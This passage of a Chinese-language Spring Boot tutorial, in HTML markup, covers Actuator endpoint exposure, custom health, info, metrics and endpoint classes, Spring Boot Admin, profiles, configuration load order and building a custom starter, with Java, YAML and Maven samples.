align="left">No</td></tr></tbody></table><p>若要更改公开的Endpoint，请配置以下的包含和排除属性：</p><table><thead><tr><th align="left">Property</th><th align="left">Default</th></tr></thead><tbody><tr><td align="left"><code>management.endpoints.jmx.exposure.exclude</code></td><td align="left"></td></tr><tr><td align="left"><code>management.endpoints.jmx.exposure.include</code></td><td align="left"><code>*</code></td></tr><tr><td align="left"><code>management.endpoints.web.exposure.exclude</code></td><td align="left"></td></tr><tr><td align="left"><code>management.endpoints.web.exposure.include</code></td><td align="left"><code>info, health</code></td></tr></tbody></table><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready-endpoints-exposing-endpoints">官方文档 - Exposing Endpoints</a></p><h2 id="79、指标监控-定制Endpoint"><a href="#79、指标监控-定制Endpoint" class="headerlink" title="79、指标监控-定制Endpoint"></a>79、指标监控-定制Endpoint</h2><h3 id="定制-Health-信息"><a href="#定制-Health-信息" class="headerlink" title="定制 Health 信息"></a>定制 Health 信息</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>    <span class="hljs-attr">health:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">show-details:</span> <span class="hljs-string">always</span> <span class="hljs-comment">#总是显示详细信息。可显示每个模块的状态信息</span><br></code></pre></td></tr></table></figure><p>通过实现<code>HealthIndicator </code>接口，或继承<code>MyComHealthIndicator </code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.actuate.health.Health;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.health.HealthIndicator;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHealthIndicator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HealthIndicator</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Health <span class="hljs-title function_">health</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">errorCode</span> <span class="hljs-operator">=</span> check(); <span class="hljs-comment">// perform some specific health check</span><br>        <span class="hljs-keyword">if</span> (errorCode != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> Health.down().withDetail(<span class="hljs-string">&quot;Error Code&quot;</span>, errorCode).build();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Health.up().build();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">构建Health</span><br><span class="hljs-comment">Health build = Health.down()</span><br><span class="hljs-comment">                .withDetail(&quot;msg&quot;, &quot;error service&quot;)</span><br><span class="hljs-comment">                .withDetail(&quot;code&quot;, &quot;500&quot;)</span><br><span class="hljs-comment">                .withException(new RuntimeException())</span><br><span class="hljs-comment">                .build();</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComHealthIndicator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHealthIndicator</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 真实的检查方法</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> builder</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doHealthCheck</span><span class="hljs-params">(Health.Builder builder)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//mongodb。  获取连接进行测试</span><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// 检查完成</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span> == <span class="hljs-number">2</span>)&#123;<br><span class="hljs-comment">//            builder.up(); //健康</span><br>            builder.status(Status.UP);<br>            map.put(<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">1</span>);<br>            map.put(<span class="hljs-string">&quot;ms&quot;</span>,<span class="hljs-number">100</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//            builder.down();</span><br>            builder.status(Status.OUT_OF_SERVICE);<br>            map.put(<span class="hljs-string">&quot;err&quot;</span>,<span class="hljs-string">&quot;连接超时&quot;</span>);<br>            map.put(<span class="hljs-string">&quot;ms&quot;</span>,<span class="hljs-number">3000</span>);<br>        &#125;<br><br><br>        builder.withDetail(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">100</span>)<br>                .withDetails(map);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="定制info信息"><a href="#定制info信息" class="headerlink" title="定制info信息"></a>定制info信息</h3><p>常用两种方式：</p><ul><li>编写配置文件</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">appName:</span> <span class="hljs-string">boot-admin</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2.0</span><span class="hljs-number">.1</span><br>  <span class="hljs-attr">mavenProjectName:</span> <span class="hljs-string">@project.artifactId@</span>  <span class="hljs-comment">#使用@@可以获取maven的pom文件值</span><br>  <span class="hljs-attr">mavenProjectVersion:</span> <span class="hljs-string">@project.version@</span><br></code></pre></td></tr></table></figure><ul><li>编写InfoContributor</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Collections;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.info.Info;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.info.InfoContributor;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInfoContributor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InfoContributor</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contribute</span><span class="hljs-params">(Info.Builder builder)</span> &#123;<br>        builder.withDetail(<span class="hljs-string">&quot;example&quot;</span>,<br>                Collections.singletonMap(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><a href="http://localhost:8080/actuator/info">http://localhost:8080/actuator/info</a> 会输出以上方式返回的所有info信息</p><h3 id="定制Metrics信息"><a href="#定制Metrics信息" class="headerlink" title="定制Metrics信息"></a>定制Metrics信息</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready-metrics-meter">Spring Boot支持的metrics</a></p><p>增加定制Metrics：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyService</span>&#123;<br>    Counter counter;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyService</span><span class="hljs-params">(MeterRegistry meterRegistry)</span>&#123;<br>         counter = meterRegistry.counter(<span class="hljs-string">&quot;myservice.method.running.counter&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        counter.increment();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//也可以使用下面的方式</span><br><span class="hljs-meta">@Bean</span><br>MeterBinder <span class="hljs-title function_">queueSize</span><span class="hljs-params">(Queue queue)</span> &#123;<br>    <span class="hljs-keyword">return</span> (registry) -&gt; Gauge.builder(<span class="hljs-string">&quot;queueSize&quot;</span>, queue::size).register(registry);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="定制Endpoint"><a href="#定制Endpoint" class="headerlink" title="定制Endpoint"></a>定制Endpoint</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Endpoint(id = &quot;container&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DockerEndpoint</span> &#123;<br><br>    <span class="hljs-meta">@ReadOperation</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">getDockerInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Collections.singletonMap(<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-string">&quot;docker started...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@WriteOperation</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">restartDocker</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;docker restarted....&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>场景：</p><ul><li>开发ReadinessEndpoint来管理程序是否就绪。</li><li>开发LivenessEndpoint来管理程序是否存活。</li></ul><h2 id="80、指标监控-Boot-Admin-Server"><a href="#80、指标监控-Boot-Admin-Server" class="headerlink" title="80、指标监控-Boot Admin Server"></a>80、指标监控-Boot Admin Server</h2><p><a href="">官方Github</a></p><p><a href="https://codecentric.github.io/spring-boot-admin/2.3.1/#getting-started">官方文档</a></p><p>可视化指标监控</p><blockquote><p>What is Spring Boot Admin?</p><p>codecentric’s Spring Boot Admin is a community project to manage and monitor your <a href="http://projects.spring.io/spring-boot/">Spring Boot</a> ® applications. The applications register with our Spring Boot Admin Client (via HTTP) or are discovered using Spring Cloud ® (e.g. Eureka, Consul). The UI is just a Vue.js application on top of the Spring Boot Actuator endpoints.</p></blockquote><p><a href="https://codecentric.github.io/spring-boot-admin/2.3.1/#getting-started">开始使用方法</a></p><h2 id="81、高级特性-Profile环境切换"><a href="#81、高级特性-Profile环境切换" class="headerlink" title="81、高级特性-Profile环境切换"></a>81、高级特性-Profile环境切换</h2><p>为了方便多环境适配，Spring Boot简化了profile功能。</p><ul><li>默认配置文件<code>application.yaml</code>任何时候都会加载。</li><li>指定环境配置文件<code>application-&#123;env&#125;.yaml</code>，<code>env</code>通常替代为<code>test</code>，</li><li>激活指定环境<ul><li>配置文件激活：<code>spring.profiles.active=prod</code></li><li>命令行激活：<code>java -jar xxx.jar --spring.profiles.active=prod  --person.name=haha</code>（修改配置文件的任意值，<strong>命令行优先</strong>）</li></ul></li><li>默认配置与环境配置同时生效</li><li>同名配置项，profile配置优先</li></ul><h3 id="Profile条件装配功能"><a href="#Profile条件装配功能" class="headerlink" title="@Profile条件装配功能"></a>@Profile条件装配功能</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><span class="hljs-comment">//在配置文件中配置</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span> <br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lun</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br><br>   String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-meta">@Profile(&quot;test&quot;)</span><span class="hljs-comment">//加载application-test.yaml里的</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br><br><span class="hljs-meta">@Profile(value = &#123;&quot;prod&quot;,&quot;default&quot;&#125;)</span><span class="hljs-comment">//加载application-prod.yaml里的</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boss</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></td></tr></table></figure><p>application-test.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test-张三</span><br><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><p>application-prod.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">prod-张三</span><br><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 激活prod配置文件</span><br><span class="hljs-attr">spring.profiles.active</span>=<span class="hljs-string">prod</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> Person person;<br><br><span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//激活了prod，则返回Boss；激活了test，则返回Worker</span><br>    <span class="hljs-keyword">return</span> person.getClass().toString();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>@Profile还可以修饰在方法上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>&#125;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Profile(&quot;prod&quot;)</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Color <span class="hljs-title function_">red</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Profile(&quot;test&quot;)</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Color <span class="hljs-title function_">green</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>可以激活一组：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.profiles.active</span>=<span class="hljs-string">production</span><br><br><span class="hljs-attr">spring.profiles.group.production[0]</span>=<span class="hljs-string">proddb</span><br><span class="hljs-attr">spring.profiles.group.production[1]</span>=<span class="hljs-string">prodmq</span><br></code></pre></td></tr></table></figure><h2 id="82、高级特性-配置加载优先级"><a href="#82、高级特性-配置加载优先级" class="headerlink" title="82、高级特性-配置加载优先级"></a>82、高级特性-配置加载优先级</h2><h3 id="外部化配置"><a href="#外部化配置" class="headerlink" title="外部化配置"></a>外部化配置</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-external-config">官方文档 - Externalized Configuration</a></p><p>Spring Boot uses a very particular <code>PropertySource</code> order that is designed to allow sensible overriding of values. Properties are considered in the following order (with values from lower items overriding earlier ones)（1优先级最低，14优先级最高）:</p><ol><li>Default properties (specified by setting <code>SpringApplication.setDefaultProperties</code>).</li><li><a href="https://docs.spring.io/spring/docs/5.3.3/javadoc-api/org/springframework/context/annotation/PropertySource.html"><code>@PropertySource</code></a> annotations on your <code>@Configuration</code> classes. Please note that such property sources are not added to the <code>Environment</code> until the application context is being refreshed. This is too late to configure certain properties such as <code>logging.*</code> and <code>spring.main.*</code> which are read before refresh begins.</li><li>Config data (such as <code>application.properties</code> files)</li><li>A <code>RandomValuePropertySource</code> that has properties only in <code>random.*</code>.</li><li>OS environment variables.</li><li>Java System properties (<code>System.getProperties()</code>).</li><li>JNDI attributes from <code>java:comp/env</code>.</li><li><code>ServletContext</code> init parameters.</li><li><code>ServletConfig</code> init parameters.</li><li>Properties from <code>SPRING_APPLICATION_JSON</code> (inline JSON embedded in an environment variable or system property).</li><li>Command line arguments.</li><li><code>properties</code> attribute on your tests. Available on <a href="https://docs.spring.io/spring-boot/docs/2.4.2/api/org/springframework/boot/test/context/SpringBootTest.html"><code>@SpringBootTest</code></a> and the <a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-testing-spring-boot-applications-testing-autoconfigured-tests">test annotations for testing a particular slice of your application</a>.</li><li><a href="https://docs.spring.io/spring/docs/5.3.3/javadoc-api/org/springframework/test/context/TestPropertySource.html"><code>@TestPropertySource</code></a> annotations on your tests.</li><li><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#using-boot-devtools-globalsettings">Devtools global settings properties</a> in the <code>$HOME/.config/spring-boot</code> directory when devtools is active.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.*;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBean</span> &#123;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span><span class="hljs-comment">//以这种方式可以获得配置值</span><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><ul><li>外部配置源<ul><li>Java属性文件。</li><li>YAML文件。</li><li>环境变量。</li><li>命令行参数。</li></ul></li><li>配置文件查找位置<ol><li>classpath 根路径。</li><li>classpath 根路径下config目录。</li><li>jar包当前目录。</li><li>jar包当前目录的config目录。</li><li>&#x2F;config子目录的直接子目录。</li></ol></li><li>配置文件加载顺序：<ol><li>当前jar包内部的<code>application.properties</code>和<code>application.yml</code>。</li><li>当前jar包内部的<code>application-&#123;profile&#125;.properties</code> 和 <code>application-&#123;profile&#125;.yml</code>。</li><li>引用的外部jar包的<code>application.properties</code>和<code>application.yml</code>。</li><li>引用的外部jar包的<code>application-&#123;profile&#125;.properties</code>和<code>application-&#123;profile&#125;.yml</code>。</li></ol></li><li>指定环境优先，外部优先，后面的可以覆盖前面的同名配置项。</li></ul><h2 id="83、高级特性-自定义starter细节"><a href="#83、高级特性-自定义starter细节" class="headerlink" title="83、高级特性-自定义starter细节"></a>83、高级特性-自定义starter细节</h2><h3 id="starter启动原理"><a href="#starter启动原理" class="headerlink" title="starter启动原理"></a>starter启动原理</h3><ul><li>starter的pom.xml引入autoconfigure依赖</li></ul><pre><code class=" mermaid">graph LRA[starter] --&gt;B[autoconfigure]B --&gt; C[spring-boot-starter]</code></pre><ul><li><p>autoconfigure包中配置使用<code>META-INF/spring.factories</code>中<code>EnableAutoConfiguration</code>的值，使得项目启动加载指定的自动配置类</p></li><li><p>编写自动配置类 <code>xxxAutoConfiguration</code> -&gt; <code>xxxxProperties</code></p></li><li><ul><li><code>@Configuration</code></li><li><code>@Conditional</code></li><li><code>@EnableConfigurationProperties</code></li><li><code>@Bean</code></li><li>……</li></ul></li><li><p>引入starter — <code>xxxAutoConfiguration</code> — 容器中放入组件 —- <code>绑定xxxProperties</code> —- 配置项</p></li></ul><h3 id="自定义starter"><a href="#自定义starter" class="headerlink" title="自定义starter"></a>自定义starter</h3><ul><li><p>目标：创建<code>HelloService</code>的自定义starter。</p></li><li><p>创建两个工程，分别命名为<code>hello-spring-boot-starter</code>（普通Maven工程），<code>hello-spring-boot-starter-autoconfigure</code>（需用用到Spring Initializr创建的Maven工程）。</p></li><li><p><code>hello-spring-boot-starter</code>无需编写什么代码，只需让该工程引入<code>hello-spring-boot-starter-autoconfigure</code>依赖：</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>hello-spring-boot-starter-autoconfigure</code>的pom.xml如下：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 